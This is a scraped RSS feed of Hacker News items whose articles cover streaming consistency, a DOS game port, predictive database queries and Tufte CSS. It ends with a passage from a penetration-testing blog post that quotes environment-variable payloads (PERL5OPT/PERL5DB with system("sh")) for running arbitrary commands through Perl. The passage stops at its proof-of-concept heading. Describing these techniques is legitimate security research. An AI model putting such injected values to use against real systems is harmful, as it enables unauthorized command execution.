<p>Imagine the join between <code>data</code> and <code>select max(data.value) from data</code> receives its eventually consistent inputs consistently later for <code>data</code> than for <code>select max(data.value) from data</code>. This is not unreasonable, as it can be easier to maintain a <code>max</code> than to maintain an entire collection (<code>data</code>). As each record of <code>data</code> arrives, even those records with maximal values at the time of their submission may find that the maximum has advanced before they got there. They no longer match the maximum value, and are not produced as output.</p>
<p>Let‚Äôs demonstrate this in <a href="https://github.com/TimelyDataflow/differential-dataflow">Differential Dataflow</a>. We‚Äôll have to fake some things out, because its consistency guarantees are unfortunately too strong. Fortunately, we can directly program transient delays in to the dataflow.</p>
<p>Imagine a collection that may have multiple keys in it, but we‚Äôll only need one. We‚Äôll increment the value associated with the key regularly (perhaps this is bandwidth used, or money spent, or most recent access, or ‚Ä¶). Importantly, we‚Äôll delay the update along one path by the gap in time between updates.</p>
<pre title="">// Global aggregation of values, on-time.
let input1 =
data.map(|(key,val)| ((),val))
    .max_by_key() // not real; should be `reduce(...)`.
    .map(|((), val)| (val, ()));

// Delayed map from values back to their keys.
let input2 =
data.delay(|t| t + 1)
    .map(|(key,val)| (val,key));

// Observe any results
input2.semijoin(&amp;input)
      .inspect(|x| println!("KEY: {:?}", x));
</pre>
<p>We‚Äôll feed in changes that add elements to <code>data</code>, one at a time. Roughly like so</p>
<pre title="">(key, 1000)
(key, 2000)
(key, 3000)
...
</pre>
<p>The keys and values aren‚Äôt important, other than that the maximum increases. If the maximum increases within the time of the delay associated with the ‚Äúeventual‚Äù nature of the consistency, we see no results:</p>
<pre title="">    Finished dev [unoptimized + debuginfo] target(s) in 0.04s
     Running `target/debug/examples/eventual`
Round 0 complete
Round 1 complete
Round 2 complete
Round 3 complete
Round 4 complete
Round 5 complete
...
</pre>
<p>Suffice it to say we didn‚Äôt see any <code>KEY</code> reports. We would, eventually, if we were to stall the input stream and allow one of the inputs to the join to catch up to the other.</p>
<p>What happens if we <code>delay</code> the <code>max</code> computation instead of the <code>data</code> stream? If the updates overwrite their previous values (<em>i.e.</em> if <code>(key, 2000)</code> overwrites <code>(key, 1000)</code>) then we also see no outputs, because by the time the maximum arrives the value has changed.</p>
<p>Eventual consistency is pretty badly suited to problem of aligning data, when the contents of either of those streams of data can be expected to move on. In our case, the maximum is regularly ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://materialize.io/eventual-consistency-isnt-for-streaming/">https://materialize.io/eventual-consistency-isnt-for-streaming/</a></em></p>]]>
            </description>
            <link>https://materialize.io/eventual-consistency-isnt-for-streaming/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23832149</guid>
            <pubDate>Tue, 14 Jul 2020 14:11:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Chopper Commando Revisited]]>
            </title>
            <description>
<![CDATA[
Score 44 | Comments 22 (<a href="https://news.ycombinator.com/item?id=23830881">thread link</a>) | @loadzero
<br/>
July 14, 2020 | https://blog.loadzero.com/blog/chopper258/ | <a href="https://web.archive.org/web/*/https://blog.loadzero.com/blog/chopper258/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<p><i>This article contains pixel art. For best results please use 100% browser zoom.</i></p>

<p><a href="https://github.com/loadzero/chopper258">chopper258</a> is a port of <a href="https://www.mobygames.com/game/chopper-commando">Chopper Commando</a>, a DOS game written by <a href="https://www.mobygames.com/developer/sheet/view/developerId,59219/">Mark Currie</a> using Turbo Pascal in 1990.</p>

<p>Some thirty years later, in 2020, I've dusted off the old code and breathed some new life into it. I've ported it to C and made it work with SDL2, and it can now run natively in modern environments.</p>

<p>The canvas below shows a minute or so of gameplay from the new version.</p>




<p>The game can also be played on the web, thanks to emscripten.</p>

<p>Let's do a quick check to see if you can play.</p>

<span>
    <p>Yes, you can play the game by <span>clicking</span> on the button below.</p>

    
    
</span>

<span>
    <p>Unfortunately, your browser looks to be incompatible. The game currently only works in Desktop Chrome, due to the use of certain low level features.</p>
</span>



<p>Thanks to Mark Currie for granting me permission to publish this translation of his game.

</p><p>In addition to publishing the <a href="https://github.com/loadzero/chopper258">source code</a>, and
<span><a href="https://blog.loadzero.com/demo/chopper258">playable version</a>,</span>
<span>playable version,</span> I am also writing a series of articles to accompany the
project, the first part of which is included below.</p>

<p>I have also made some animations and interactive parts that you can <span>play</span> around
with, such as the <a href="#picker_link">palette picker</a> later on in this piece.</p>



<h2>Background</h2>

<p>I chose to revisit Chopper Commando for a few reasons.

</p><p>One of the biggest ones is nostalgia. I remember enjoying playing this game
as a child, on my PC and with others, and being surprised at some of the novel
mechanics. I also remember having a good laugh.

</p><p>This is the first game I played where you could leave a
vehicle, run around and do things on foot, and then get back in and keep going.
I thought that was so cool, and it was an early precursor to the sandbox games I
enjoy today.

</p><p>I have a soft spot for bedroom coded efforts like this, where the heart and
soul of the game isn't obscured by many layers of polish. It's not too hard to
imagine a 15-year old Mark Currie writing a game for himself on his 286, and
getting a real kick out of doing so.

</p><p>Games like this were pretty formative for me as a young aspiring games
programmer. Unlike something like Super Mario, which seemed unreachable to me at the time, I could play this and start working out how to make something similar, even with the simple tools I had.

</p><h2>Project Scale</h2>

<p>This was a bit smaller and more straightforward than my previous effort,
<a href="http://blog.loadzero.com/blog/si78c/">Space Invaders In C</a>. This project
took around 3 months of calendar time, and about 200 hours were spent on it in total.

</p><p>As the source code to the game was available, albeit in Pascal, not much
reverse engineering was required. Most of the effort went into the translation
to C, and building new code to provide workalikes for the Turbo Pascal API.

</p><p>One of the last parts I worked on, the sound, also turned out to be one of
the most difficult. The original game used PC speaker sound in a dynamic way,
and I had to write a synthesizer for it. It was quite fiddly to get the timing
right and make it sound like the original. More on that in part two.

</p><p>The original code is around 5500 lines of Pascal, all of it game logic code.
The new C version is around 5500 lines of game logic, 1500 lines of support
code and 400 lines of comments.

</p><p>Compared to the last project, there isn't too much behind the scenes
unpublished code in this one. I wrote a few small pieces to aid translation,
some scripts to build the font data, and some prototypes to help figure out the
sound code.

</p><p>I did end up writing a little bit of pascal code, mostly as temporary mods to the
original game source to help me figure out what the original system was doing. More
detail on compiling the old code is provided in a later piece.

</p><h2>Graphics</h2>

<p>One of the very first things I did on the project was to figure out the framebuffer format
for the original game, and start hacking to get it to display on a modern system.

</p><p>The frame buffer is CGA, meaning it is 320 pixels wide, 200 lines high and has
2 bit paletted color, for a grand total of four possible colors on screen at
any one time.

</p><p>Below is a selection of screen shots from the game in all their CGA glory.</p>



<p>If you look carefully, even though each screen can only show four colors, 
you can see that there are more than four colors in total. This is due to
palettes. In the CGA scheme, four base color palettes are available and each has a
different arrangement of sixteen possible colors.

</p><p>As an extra tweak, the first color in the palette (typically the background color), can be
freely chosen out of the sixteen, giving slightly more flexibility. This means that there
are sixteen variations of each of the four base palettes, giving sixty four palettes in total.

<a id="picker_link"></a>

</p><p>To play with the color combinations, <span>click</span> on the colored areas in the first panel below.
You can pick a palette and background color, and the effect will be shown in the second panel,
using one of the screenshots. Use prev and next to cycle to a different screenshot.

</p>


<p>In the old system, the framebuffer and the palette settings are bits of memory
that live on the graphics card and are twiddled by the game directly. In the
new system, these reside in host memory, and must be converted into a modern texture format
on the fly every frame for the GPU to use.

</p><p>Given that there are only 64 possible palettes, a neat trick can be used to
simplify and speed up the framebuffer conversion. Before the game starts
running, every possible combination of palette, background color and input
framebuffer byte (4 pixels at 2bpp) are iterated through, and the resulting 8
output bytes (4 pixels at 16bpp) are stored in a 16 * 4 * 256 entry lookup
table. Converting the framebuffer each frame is then just a matter of iterating
through each byte and performing a simple lookup and memcpy to stamp out four
pixels at a time.

</p><h2>To be continued...</h2>

<p>As mentioned earlier, the sound code was one of the hardest parts of the port. Part two
explains why that was so, and the solution I used to solve it.</p>

<p>The canvas below shows a little preview.</p>












</article></div>]]>
            </description>
            <link>https://blog.loadzero.com/blog/chopper258/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23830881</guid>
            <pubDate>Tue, 14 Jul 2020 12:07:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Could predictive database queries replace machine learning models?]]>
            </title>
            <description>
<![CDATA[
Score 87 | Comments 46 (<a href="https://news.ycombinator.com/item?id=23830474">thread link</a>) | @tlarkworthy
<br/>
July 14, 2020 | https://aito.ai/blog/could-predictive-database-queries-replace-machine-learning-models | <a href="https://web.archive.org/web/*/https://aito.ai/blog/could-predictive-database-queries-replace-machine-learning-models">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blockquote><p>This post appeared first on <a href="https://towardsdatascience.com/predictive-queries-vs-supervised-ml-models-ee7f17e4840e">Towards Data Science</a> in July 12th, 2020.</p></blockquote><p>One of the greatest trends in today‚Äôs technology landscape is the <a href="http://knowledge.wharton.upenn.edu/article/democratization-ai-means-tech-innovation/">democratization of machine learning</a>. Because the commodity state-of-the-art models, better tooling and better access to hardware: machine learning is becoming an everyday tool in the companies‚Äô toolbox.</p><p>The ML democratization is still an on-going trend and given the disruption in this space it‚Äôs worth asking: where will this transformation take us? What the future of the everyday ML will look like?</p><p>Predictive queries are an interesting take on machine learning, especially in the ML democratization context. Solutions like <a href="http://probcomp.csail.mit.edu/">MIT‚Äôs</a> <a href="https://github.com/probcomp/bayeslite">BayesDB/BayesLite</a> and Aito provide a way to get arbitrary predictions instantly with SQL-like queries. As an example, here‚Äôs a predictive query in Aito:</p><div data-language="json"><pre><code><span>{</span>
  <span>"from"</span><span>:</span> <span>"invoice_data"</span><span>,</span>
  <span>"where"</span><span>:</span> <span>{</span>
    <span>"Item_Description"</span><span>:</span> <span>"Packaging design"</span><span>,</span>
    <span>"Vendor_Code"</span><span>:</span> <span>"VENDOR-1676"</span>
  <span>}</span><span>,</span>
  <span>"predict"</span><span>:</span> <span>"Product_Category"</span>
<span>}</span></code></pre></div><p>As such: the predictive queries seem like an easier, faster and radically different way to do machine learning. They give a glimpse of a future, where anyone can do machine learning as easily as one does database queries.</p><p>This article gives a brief introduction to the predictive queries, and it compares the predictive queries to supervised learning through 3 different aspects that are:</p><ol><li>The workflow, comparing the easiness and the costs between predictive queries and supervised machine learning</li><li>The architecture, comparing the high level differences between using predictive queries and using supervised models</li><li>And the qualitative properties (scaling, accuracy) as the quality is an obvious concern for an emerging, if promising, technology.</li></ol><h2>Introduction to the predictive queries</h2><p>Predictive queries resemble normal database queries with the exception that they provide predictions about the unknown, while the traditional database queries provide facts about the known. Here‚Äôs an example of the BQL (Bayesian Query Language) query done against BayesDB/BayesLite database:</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/pq-vs-ml-predictive-queries-in-bayeslite.png" alt=""></p></div><p><span>Predictive BayesQL queries in BayesLite. BayesQL is based on SQL and it provides a very elegant way to query arbitrary estimates. This query can be executed after the CREATE POPULATION, CREATE ANALYSIS, INITIALIZE ANALYSIS and ANALYZE operations. </span></p></div><p>In essence, the predictive queries can provide a very SQL-like alternative to the supervised ML models with the key differences that:</p><ol><li><p>While supervised machine learning models need to be configured, trained and deployed before usage, the predictive queries provide instant answers after the database is prepared with data. As such: the predictive queries have a different workflow.</p></li><li><p>While supervised machine learning is always specialized for a single prediction from A to B, predictive queries can be used a) to instantly predict any unknown X based on any known Y and b) to provide also recommendations, smart search and pattern mining. As such, the supervised models are narrow, while the predictive queries are multipurpose, which has implications on the architecture.</p></li><li><p>While with the supervised machine learning the narrow models are explicitly formed train time, the predictive queries do multi-purpose modeling write time or narrow modeling during query time. As such: the predictive queries are technically more challenging.</p></li></ol><p>Only few solutions exist, that provide such predictive queries. One is the mentioned BayesDB/BayesLite, which creates an in-memory multi-purpose models in a special preparation phase. Another solution is Aito.ai, which does query-time narrow modeling without explicit preparations. Here‚Äôs is an example of the Aito workflow:</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/pq-vs-ml-predictive-queries-in-3-steps.png" alt=""></p></div><p><span>Predictive BayesQL queries in BayesLite. BayesQL is based on SQL and it provides a very elegant way to query arbitrary estimates. This query can be executed after the CREATE POPULATION, CREATE ANALYSIS, INITIALIZE ANALYSIS and ANALYZE operations. </span></p></div><p>We are focusing the following comparisons on Aito. We feel this focus is justified as in Aito we are more familiar with the solution, and it is mature enough to serve the end customers in live production settings. While BayesLite is extremely impressive and their BQL interface and DB/ML integration are worth envy: BayesLite seems to have properties like the 16 minute preparation phase for simple data, which are not consistent with the presented arguments.</p><p>So let‚Äôs next dig deeper on the difference in workflow, architecture and quality between the predictive queries and supervised ML models.</p><h2>1. The Workflow</h2><p>The first difference between predictive queries and the traditional supervised models relates to the workflow and the costs.</p><p>Supervised ML models are deployed typically in data science projects, which have several steps like the handover to the data scientist, data preparation, feature engineering, model fitting, deployment, integrations, retraining and monitoring &amp; maintenance. As an addition to this linear progression, you also often have an iteration phase, where the results are improved by refining the data, the preparations, the features, the models, the deployment or the integrations.</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/pq-vs-ml-data-science-project-workflow.png" alt=""></p></div><p><span>A simplified version of the data science project.</span></p></div><p>Taking a supervised model to production may take several weeks or months from one to two persons. This can raise the price point up to hundred thousand euros per model. If you need several models, you need several data science projects, leading to multiplied expenses and delays.</p><p>Now this process changes rather dramatically, if you implement the machine learning functionality with predictive queries. With predictive queries the workflow is in essence the following:</p><ol><li>Prepare the auxiliary <a href="https://aito.ai/blog/introducing-a-new-database-category-the-predictive-database/">predictive database</a> once (if it‚Äôs not used as the main database)</li><li>Verify good enough prediction quality with evaluate requests</li><li>Integrate the predictive queries like you would integrate SQL queries</li><li>Write the test/evaluation cases, push these to Git and let the CI handle the regression testing</li><li>If seen as necessary: track the in-production prediction quality with analytics and display the metrics in the product dashboard.</li></ol><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/pq-vs-ml-predictive-query-workflow.png" alt=""></p></div><p><span>The workflow with the predictive queries is similar to the workflow with the database queries. Still, because predictive functionality is statistical and its behavior may drift as the data changes: it is advisable to verify the prediction quality (step 2) before implementation and monitor the prediction quality in production (step 5).</span></p></div><p>While putting an auxiliary database (like ElasticSearch) into production can take weeks, the expense related to putting each query into production is closer to the expense of using search/database queries. Often such queries form only a small part of the related functionality‚Äôs expense, and often the query based functionality can be implemented in hours and put into production in days.</p><p>This dramatic difference between the workflows and the expenses are explained a) partly by the <a href="https://aito.ai/blog/introducing-a-new-database-category-the-predictive-database/">predictive database</a>‚Äôs AutoML capabilities that are accelerated by a specialized database and b) partly by the reduced need for deployments and integrations as the data and the ML are already integrated into a single system. The complex phases of the data science project get systematically eliminated or simplified:</p><ol><li>The handover of the data science project to the data scientist is not needed as the predictive query workflow is easy enough for the software developers.</li><li>Data preparation and feature engineering steps can be greatly eliminated with the ML-database integration. You don‚Äôt need to re-prepare and re-upload the data, if the data is already in the database. You don‚Äôt need to manually aggregate data into flat data frames, if you can do <a href="https://aito.ai/docs/articles/utilizing-relationships-in-aito/">inference through the database references</a>. You don‚Äôt need to manually featurize text either, as the predictive database analyzes the <a href="https://aito.ai/docs/api/#schema-analyzer">text automatically</a> just like ElasticSearch. Last: you don‚Äôt need to manage feature redundancies, if the database has built-in <a href="https://aito.ai/blog/introducing-concept-learning-to-free-you-from-feature-engineering/">feature learning capabilities</a>.</li><li>Modeling phase can be automated with a single sophisticated model that provides good enough results for most applications.</li><li>Per model cloud deployment, live integrations and retraining of models simply disappear, because you don‚Äôt need to ‚Äòdeploy‚Äô or retrain the predictive queries. Instead you integrate one auxiliary predictive database like you would integrate <a href="https://www.elastic.co/">ElasticSearch</a>. If you use the predictive database as your main database, you can omit even that one integration.</li><li>Maintenance is easier, because instead of maintaining deployed infrastructure for each prediction target, you maintain the SQL-like queries like you would maintain code with Git &amp; CI.</li></ol><p>As a consequence, the workflow and the cost of implementing ML via predictive queries is similar to the process of implementing normal business logic via SQL.</p><p>The second difference between the predictive queries and the supervised models is the narrowness and it‚Äôs implications on the software architecture.</p><p>Famously: the supervised ML models are <em>narrow</em> in 2 different respects:</p><p>1.Narrowness of the prediction setting. Supervised learning models are essentially narrow functions from A (e.g. text) to B (category), which means that if you have 10 different problems, you end up with with 10 different supervised ML models.
2. Narrowness of the predictive functionality type. A single kind of supervised method can typically serve only one kind of predictions. For this reason you often need completely separate systems or products to implement predictions, recommendations, smart search and pattern mining.d up with with 10 different supervised ML models.</p><p>This combined narrowness has negative implications on the architecture. If you have 10 different predictive functionalities that mix prediction, recommendation and smart search use cases: you end up struggling with a very complex system. The system may include separate supervised model platform with half dozen deployed models, separate recommendation system, a separate smart searching product and separate pattern mining tools. Such complexity is hard to learn, master and ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://aito.ai/blog/could-predictive-database-queries-replace-machine-learning-models">https://aito.ai/blog/could-predictive-database-queries-replace-machine-learning-models</a></em></p>]]>
            </description>
            <link>https://aito.ai/blog/could-predictive-database-queries-replace-machine-learning-models</link>
            <guid isPermaLink="false">hacker-news-small-sites-23830474</guid>
            <pubDate>Tue, 14 Jul 2020 11:01:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tufte CSS]]>
            </title>
            <description>
<![CDATA[
Score 60 | Comments 9 (<a href="https://news.ycombinator.com/item?id=23828196">thread link</a>) | @mmastrac
<br/>
July 13, 2020 | https://edwardtufte.github.io/tufte-css/ | <a href="https://web.archive.org/web/*/https://edwardtufte.github.io/tufte-css/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
      
      <p>Dave Liepmann</p>
      <section>
        <p>Tufte CSS provides tools to style web articles using the ideas demonstrated by Edward Tufte‚Äôs books and handouts. Tufte‚Äôs style is known for its simplicity, extensive use of sidenotes, tight integration of graphics with text, and carefully chosen typography.</p>
        <p>Tufte CSS was created by <a href="http://www.daveliepmann.com/">Dave Liepmann</a> and is now an Edward Tufte project. The original idea was cribbed from <a href="https://tufte-latex.github.io/tufte-latex/">Tufte-<span>L<span>a</span>T<span>e</span>X</span></a> and <a href="http://rmarkdown.rstudio.com/tufte_handout_format.html">R Markdown‚Äôs Tufte Handout format</a>. We give hearty thanks to all the people who have contributed to those projects.</p>
        <p>If you see anything that Tufte CSS could improve, we welcome your contribution in the form of an issue or pull request on the GitHub project: <a href="https://github.com/edwardtufte/tufte-css">tufte-css</a>. Please note the <a href="https://github.com/edwardtufte/tufte-css#contributing">contribution guidelines</a>.</p>
        <p>Finally, a reminder about the goal of this project. The web is not print. Webpages are not books. Therefore, the goal of Tufte CSS is not to say ‚Äúwebsites should look like this interpretation of Tufte‚Äôs books‚Äù but rather ‚Äúhere are some techniques Tufte developed that we‚Äôve found useful in print; maybe you can find a way to make them useful on the web‚Äù. Tufte CSS is merely a sketch of one way to implement this particular set of ideas. It should be a starting point, not a design goal, because any project should present their information as best suits their particular circumstances.</p>
      </section>

      <section>
        <h2 id="getting-started">Getting Started</h2>
        <p>To use Tufte CSS, copy <code>tufte.css</code> and the <code>et-book</code> directory of font files to your project directory, then add the following to your HTML document‚Äôs <code>head</code> block:</p>

        <pre><code>&lt;link rel="stylesheet" href="tufte.css"/&gt;</code></pre>

        <p>Now you just have to use the provided CSS rules, and the Tufte CSS conventions described in this document. For best results, View Source and Inspect Element frequently.</p>
      </section>

      <section>
        <h2 id="fundamentals">Fundamentals</h2>
        <h3 id="fundamentals--sections-and-headers">Sections and Headings</h3>
        <p>Organize your document with an <code>article</code> element inside your <code>body</code> tag. Inside that, use <code>section</code> tags around each logical grouping of text and headings.</p>
        <p>Tufte CSS uses <code>h1</code> for the document title, <code>p</code> with class <code>subtitle</code> for the document subtitle, <code>h2</code> for section headings, and <code>h3</code> for low-level headings. More specific headings are not supported. If you feel the urge to reach for a heading of level 4 or greater, consider redesigning your document:</p>
        <blockquote cite="http://www.edwardtufte.com/bboard/q-and-a-fetch-msg?msg_id=0000hB">
          <p>[It is] notable that the Feynman lectures (3 volumes) write about all of physics in 1800 pages, using only 2 levels of hierarchical headings: chapters and A-level heads in the text. It also uses the methodology of <em>sentences</em> which then cumulate sequentially into <em>paragraphs</em>, rather than the grunts of bullet points. Undergraduate Caltech physics is very complicated material, but it didn‚Äôt require an elaborate hierarchy to organize.</p>
          
        </blockquote>
        <p>As a bonus, this excerpt regarding the use of headings provides an example of block quotes. In Tufte CSS they are just lightly styled, semantically correct HTML using <code>blockquote</code> and <code>footer</code> elements. See page 20 of <a href="https://www.edwardtufte.com/tufte/books_vdqi">The Visual Display of Quantitative Information</a> for an example in print.</p>
        <p><span>In his later books<label for="sn-in-his-later-books"></label></span><span><a href="http://www.edwardtufte.com/tufte/books_be"><em>Beautiful Evidence</em></a></span>, Tufte starts each section with a bit of vertical space, a non-indented paragraph, and the first few words of the sentence set in small caps. For this we use a span with the class <code>newthought</code>, as demonstrated at the beginning of this paragraph. Vertical spacing is accomplished separately through <code>&lt;section&gt;</code> tags. Be consistent: though we do so in this paragraph for the purpose of demonstration, do not alternate use of header elements and the <code>newthought</code> technique. Pick one approach and stick to it.</p>

        <h3 id="fundamentals--text">Text</h3>
        <p>Although paper handouts obviously have a pure white background, the web is better served by the use of slightly off-white and off-black colors. Tufte CSS uses <code>#fffff8</code> and <code>#111111</code> because they are nearly indistinguishable from their ‚Äòpure‚Äô cousins, but dial down the harsh contrast. We stick to the greyscale for text, reserving color for specific, careful use in figures and images.</p>
        <p>In print, Tufte has used the proprietary Monotype Bembo<label for="sn-proprietary-monotype-bembo"></label><span>See Tufte‚Äôs comment in the <a href="http://www.edwardtufte.com/bboard/q-and-a-fetch-msg?msg_id=0000Vt">Tufte book fonts</a> thread.</span> font. A similar effect is achieved in digital formats with the now open-source <a href="https://github.com/edwardtufte/et-book">ETBook</a>, which Tufte CSS supplies with a <code>@font-face</code> reference to a .ttf file. In case ETBook somehow doesn‚Äôt work, Tufte CSS shifts gracefully to other serif fonts like Palatino and Georgia.</p>
        <p>Also notice how Tufte CSS includes separate font files for bold (strong) and italic (emphasis), instead of relying on the browser to mechanically transform the text. This is typographic best practice.</p>
        <p>If you prefer sans-serifs, use the <code>sans</code> class. It relies on Gill Sans, Tufte‚Äôs sans-serif font of choice.</p>
        <p>Links in Tufte CSS match the body text in color and do not change on mouseover or when clicked. Here is a <a href="#">dummy example</a> that goes nowhere. These links are underlined, since this is the most widely recognized indicator of clickable text. <label for="mn-blue-links">‚äï</label><span>Blue text, while also a widely recognizable clickable-text indicator, is crass and distracting. Luckily, it is also rendered unnecessary by the use of underlining.</span> However, because most browsers‚Äô default underlining does not clear descenders and is so thick and distracting, the underline effect is instead achieved using CSS trickery involving background gradients instead of standard <code>text-decoration</code>. Credit goes to Adam Schwartz for that technique.</p>
        <p>As always, these design choices are merely one approach that Tufte CSS provides by default. Other approaches can also be made to work. The goal is to make sentences readable without interference from links, as well as to make links immediately identifiable even by casual web users.</p>
      </section>

      <section>
        <h2 id="epigraphs">Epigraphs</h2>
        <div>
          <blockquote>
            <p>The English language . . . becomes ugly and inaccurate because our thoughts are foolish, but the slovenliness of our language makes it easier for us to have foolish thoughts.</p>
            
          </blockquote>
          <blockquote>
            <p>For a successful technology, reality must take precedence over public relations, for Nature cannot be fooled.</p>
            
          </blockquote>
          <blockquote>I do not paint things, I paint only the differences between things.</blockquote>
        </div>
        <p>If you‚Äôd like to introduce your page or a section of your page with some quotes, use epigraphs. Modeled after chapter epigraphs in Tufte‚Äôs books (particularly <em>Beautiful Evidence</em>), these are <code>blockquote</code> elements with a bit of specialized styling. Quoted text is italicized. The source goes in a <code>footer</code> element inside the <code>blockquote</code>. We have provided three examples in the epigraph of this section, demonstrating shorter and longer quotes, with and without a paragraph tag, and showing how multiple quotes within an epigraph fit together with the use of a wrapper class.</p>
      </section>

      <section>
        <h2 id="sidenotes">Sidenotes: Footnotes and Marginal Notes</h2>
        <p>One of the most distinctive features of Tufte‚Äôs style is his extensive use of sidenotes.<label for="sn-extensive-use-of-sidenotes"></label><span>This is a sidenote.</span> Sidenotes are like footnotes, except they don‚Äôt force the reader to jump their eye to the bottom of the page, but instead display off to the side in the margin. Perhaps you have noticed their use in this document already. You are very astute.</p>
        <p>Sidenotes are a great example of the web not being like print. On sufficiently large viewports, Tufte CSS uses the margin for sidenotes, margin notes, and small figures. On smaller viewports, elements that would go in the margin are hidden until the user toggles them into view. The goal is to present related but not necessary information such as asides or citations <em>as close as possible</em> to the text that references them. At the same time, this secondary information should stay out of the way of the eye, not interfering with the progression of ideas in the main text.</p>
        <p>Sidenotes consist of two elements: a superscript reference number that goes inline with the text, and a sidenote with content. To add the former, just put a label and dummy checkbox into the text where you want the reference to go, like so:</p>
        <pre><code>&lt;label for="sn-demo"
       class="margin-toggle sidenote-number"&gt;
&lt;/label&gt;
&lt;input type="checkbox"
       id="sn-demo"
       class="margin-toggle"/&gt;</code></pre>
        <p>You must manually assign a reference <code>id</code> to each side or margin note, replacing ‚Äúsn-demo‚Äù in the <code>for</code> and the <code>id</code> attribute values with an appropriate descriptor. It is useful to use prefixes like <code>sn-</code> for sidenotes and <code>mn-</code> for margin notes.</p>
        <p>Immediately adjacent to that sidenote reference in the main text goes the sidenote content itself, in a <code>span</code> with class <code>sidenote</code>. This tag is also inserted directly in the middle of the body text, but is either pushed into the margin or hidden by default. Make sure to position your sidenotes correctly by keeping the sidenote-number label close to the sidenote itself.</p>
        <p>If you want a sidenote without footnote-style numberings, then you want a margin note.
          <label for="mn-demo">‚äï</label>
          
          <span>
            This is a margin note. Notice there isn‚Äôt a number preceding the note.
          </span> On large screens, a margin note is just a sidenote that omits the reference number. This lessens the distracting effect taking away from the flow of the main text, but can increase the cognitive load of matching a margin note to its referent text. However, on small screens, a margin note is like a sidenote except its viewability-toggle is a symbol rather than a reference number. This document currently uses the symbol ‚äï (<code>&amp;#8853;</code>), but it‚Äôs up to you.</p>
        <p>Margin notes are created just like sidenotes, but with the <code>marginnote</code> class for the content and the <code>margin-toggle</code> class for the label and dummy checkbox. For instance, here is the code for the margin note used in the previous paragraph:</p>
        <pre><code>&lt;label for="mn-demo" class="margin-toggle"&gt;&amp;#8853;&lt;/label&gt;
&lt;input type="checkbox" id="mn-demo" class="margin-toggle"/&gt;
&lt;span class="marginnote"&gt;
  This is a margin note. Notice there isn‚Äôt a number preceding the note.
&lt;/span&gt;</code></pre>
        </section></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://edwardtufte.github.io/tufte-css/">https://edwardtufte.github.io/tufte-css/</a></em></p>]]>
            </description>
            <link>https://edwardtufte.github.io/tufte-css/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23828196</guid>
            <pubDate>Tue, 14 Jul 2020 03:29:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Strange public IPv4 address assigned behind NAT (2019)]]>
            </title>
            <description>
<![CDATA[
Score 85 | Comments 88 (<a href="https://news.ycombinator.com/item?id=23827521">thread link</a>) | @rohan1024
<br/>
July 13, 2020 | https://broadbandforum.co/t/190267/ | <a href="https://web.archive.org/web/*/https://broadbandforum.co/t/190267/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://broadbandforum.co/t/190267/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23827521</guid>
            <pubDate>Tue, 14 Jul 2020 01:12:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hacking with environment variables]]>
            </title>
            <description>
<![CDATA[
Score 226 | Comments 65 (<a href="https://news.ycombinator.com/item?id=23827486">thread link</a>) | @pentestercrab
<br/>
July 13, 2020 | https://www.elttam.com/blog/env/ | <a href="https://web.archive.org/web/*/https://www.elttam.com/blog/env/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                        

<p>On a recent project we gained the ability to specify environment variables but not the process that was executed.
We were also unable to control the contents of a file on disk, and bruteforcing process identifiers (PIDs) and file descriptors found no interesting results, eliminating <a href="https://www.elttam.com/blog/goahead/">remote LD_PRELOAD exploitation</a>.
Fortunately, a scripting language interpreter was executed which enabled us to execute arbitrary commands by specifying particular environment variables.
This blog post discusses how arbitrary commands can be executed by a range of scripting language interpreters when supplied with malicious environment variables.</p>



<p>A quick read of the <code>ENVIRONMENT</code> section of the <code>perlrun(1)</code> man page reveals plenty of environment variables worth investigating.
The <code>PERL5OPT</code> environment variable allows specifying command-line options, but is restricted to only accepting the options <code>CDIMTUWdmtw</code>.
This unfortunately means that <code>-e</code>, which allows supplying perl code to run, is out.</p>

<p>All is not lost though, as demonstrated in the <a href="https://github.com/HackerFantastic/exploits/blob/master/cve-2016-1531.sh">exploit</a> for CVE-2016-1531 by <a href="https://twitter.com/hackerfantastic">Hacker Fantastic</a>.
The exploit writes a malicious perl module to <code>/tmp/root.pm</code> and supplies the environment variables <code>PERL5OPT=-Mroot</code> and <code>PERL5LIB=/tmp</code> to achieve arbitrary code execution.
However this was an exploit for a local privilege escalation vulnerability and a generic technique should ideally not require access to the file system. Looking at <a href="https://twitter.com/bl4sty">blasty</a>‚Äôs <a href="https://haxx.in/blasty-vs-exim.sh">exploit</a> for the same CVE, the exploit did not require creating a file and used the environment variables <code>PERL5OPT=-d</code> and <code>PERL5DB=system("sh");exit;</code>.
The same environment variables were also used to <a href="https://old.reddit.com/r/netsec/comments/1dm8fv/hack_this_website_and_win_bitcoins_the_first/c9tm6j4/">solve a CTF challenge</a> in 2013.</p>

<p>One final nicety of a generic technique would be to use a single environment variable instead of two.
<a href="https://twitter.com/justinsteven">@justinsteven</a> found this was possible by leveraging <code>PERL5OPT=-M</code>.
While either <code>-m</code> or <code>-M</code> can be used to load a perl module, the <code>-M</code> option allows adding extra code after the module name.</p>

<h2 id="proof-of-concept">Proof of Concept</h2>

